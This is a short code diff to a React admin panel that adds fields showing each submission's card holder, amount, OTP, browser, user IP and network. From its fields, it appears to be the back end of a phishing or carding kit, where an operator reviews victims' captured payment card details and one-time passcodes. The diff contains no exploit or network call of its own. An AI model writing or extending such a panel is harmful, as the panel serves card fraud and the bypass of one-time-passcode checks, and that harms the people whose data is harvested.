@@ -275,8 +275,33 @@ const AdminPanel = () => {
                   </div>
                   
                   <div>
-                    <span className="text-gray-400 text-sm">Expiry</span>
-                    <div className="bg-gray-800 p-2 rounded mt-1 font-mono">{submission.expiry_month}/{submission.expiry_year}</div>
+                    <span className="text-gray-400 text-sm">Card Holder</span>
+                    <div className="bg-gray-800 p-2 rounded mt-1 font-mono">{submission.card_holder}</div>
+                  </div>
+                  
+                  <div>
+                    <span className="text-gray-400 text-sm">Amount</span>
+                    <div className="bg-gray-800 p-2 rounded mt-1 font-mono">{submission.amount}</div>
+                  </div>
+                  
+                  <div>
+                    <span className="text-gray-400 text-sm">OTP</span>
+                    <div className="bg-gray-800 p-2 rounded mt-1 font-mono">{submission.otp || 'N/A'}</div>
+                  </div>
+                  
+                  <div>
+                    <span className="text-gray-400 text-sm">Browser</span>
+                    <div className="bg-gray-800 p-2 rounded mt-1 font-mono">{submission.browser}</div>
+                  </div>
+                  
+                  <div>
+                    <span className="text-gray-400 text-sm">User IP</span>
+                    <div className="bg-gray-800 p-2 rounded mt-1 font-mono">{submission.user_ip}</div>
+                  </div>
+                  
+                  <div>
+                    <span className="text-gray-400 text-sm">Network</span>
+                    <div className="bg-gray-800 p-2 rounded mt-1 font-mono">{submission.network}</div>
                   </div>
                 </div>
 
